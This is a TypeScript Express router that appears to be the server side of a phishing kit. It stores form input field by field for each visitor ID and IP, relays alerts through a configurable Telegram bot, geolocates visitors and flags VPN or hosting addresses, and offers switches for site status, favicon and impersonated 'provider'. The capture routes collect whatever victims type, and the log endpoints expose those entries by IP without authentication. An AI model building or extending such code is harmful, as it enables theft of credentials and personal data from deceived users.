import { Router, type IRouter, type Request, type Response } from "express";
import healthRouter from "./health";
import { globalProvider, getSiteActive, setSiteActive, getFaviconChoice, setFaviconChoice, captureFormDataHTTP, readCapturesByIp, deleteCapturesByIp } from "../ws.js";
import { getTelegramStatus, saveTelegramConfig, sendTelegramMessage } from "../lib/telegram.js";

const router: IRouter = Router();

router.use(healthRouter);

router.get('/global-provider', (_req: Request, res: Response) => {
  return res.json({ provider: globalProvider });
});

router.get('/admin-config', (_req: Request, res: Response) => {
  return res.json({ passcodeRequired: !!process.env['ADMIN_PASSCODE'] });
});

function isAuthorizedAdmin(req: Request): boolean {
  const required = process.env['ADMIN_PASSCODE'];
  return !required || req.header('x-admin-passcode') === required;
}

router.get('/telegram-setting', (req: Request, res: Response) => {
  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
  return res.json(getTelegramStatus());
});

router.post('/telegram-setting', (req: Request, res: Response) => {
  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
  const { botToken, chatId, enabled } = req.body as { botToken?: string; chatId?: string; enabled?: boolean };
  if (typeof chatId !== 'string' || typeof enabled !== 'boolean') {
    return res.status(400).json({ error: 'chatId and enabled are required' });
  }
  if (!botToken?.trim() && !getTelegramStatus().configured) {
    return res.status(400).json({ error: 'Bot token is required' });
  }
  return res.json(saveTelegramConfig({ botToken, chatId, enabled }));
});

router.post('/telegram-setting/test', async (req: Request, res: Response) => {
  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
  const sent = await sendTelegramMessage('Ping — Telegram notifications are working.', true);
  return sent ? res.json({ ok: true }) : res.status(502).json({ error: 'Telegram rejected the message. Check the token and chat ID.' });
});

router.get('/site-status', (_req: Request, res: Response) => {
  return res.json({ active: getSiteActive() });
});

router.get('/favicon-setting', (_req: Request, res: Response) => {
  return res.json({ favicon: getFaviconChoice() });
});

router.post('/favicon-setting', (req: Request, res: Response) => {
  const { favicon } = req.body as { favicon?: string };
  if (typeof favicon !== 'string') return res.status(400).json({ error: 'favicon is required' });
  const saved = setFaviconChoice(favicon);
  if (!saved) return res.status(400).json({ error: 'invalid favicon choice' });
  return res.json({ favicon: saved });
});

router.post('/site-status', (req: Request, res: Response) => {
  const { active } = req.body as { active: boolean };
  if (typeof active !== 'boolean') return res.status(400).json({ error: 'active must be boolean' });
  setSiteActive(active);
  return res.json({ active: getSiteActive() });
});

router.get('/location', async (req: Request, res: Response) => {
  const fwd = req.headers['x-forwarded-for'];
  const raw = fwd ? (Array.isArray(fwd) ? fwd[0] : fwd).split(',')[0]?.trim() : req.socket.remoteAddress ?? '0.0.0.0';
  const ip = (raw ?? '0.0.0.0').replace(/^::ffff:/, '');

  const isLocal =
    ip === '127.0.0.1' || ip === '::1' ||
    ip.startsWith('10.') || ip.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip);

  if (isLocal) {
    return res.json({ city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️', isVpn: false, ip });
  }

  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,country,countryCode,proxy,hosting`);
    const data = await (r.json() as Promise<{ status: string; city: string; country: string; countryCode: string; proxy: boolean; hosting: boolean }>);
    if (data.status === 'success') {
      const flag = data.countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
      return res.json({ city: data.city, country: data.country, countryCode: data.countryCode, flag, isVpn: data.proxy || data.hosting, ip });
    }
  } catch { /* fall through */ }

  return res.json({ city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐', isVpn: false, ip });
});

router.post('/capture', (req: Request, res: Response) => {
  const { visitorId, field, value } = req.body as { visitorId?: string; field?: string; value?: string };
  if (!visitorId || !field || value == null) return res.status(400).json({ error: 'missing fields' });
  const fwd = req.headers['x-forwarded-for'];
  const raw = fwd ? (Array.isArray(fwd) ? fwd[0] : fwd).split(',')[0]?.trim() : req.socket.remoteAddress ?? '0.0.0.0';
  const visitorIp = (raw ?? '0.0.0.0').replace(/^::ffff:/, '');
  const result = captureFormDataHTTP(visitorId, visitorIp, field, value);
  return res.json(result);
});

router.get('/capture-log', (req: Request, res: Response) => {
  const ip = (req.query['ip'] as string | undefined) ?? '';
  if (!ip) return res.status(400).json({ error: 'ip required' });
  const entries = readCapturesByIp(ip);
  return res.json({ entries });
});

router.delete('/capture-log', (req: Request, res: Response) => {
  const ip = (req.query['ip'] as string | undefined) ?? '';
  if (!ip) return res.status(400).json({ error: 'ip required' });
  deleteCapturesByIp(ip);
  return res.json({ ok: true });
});

export default router;
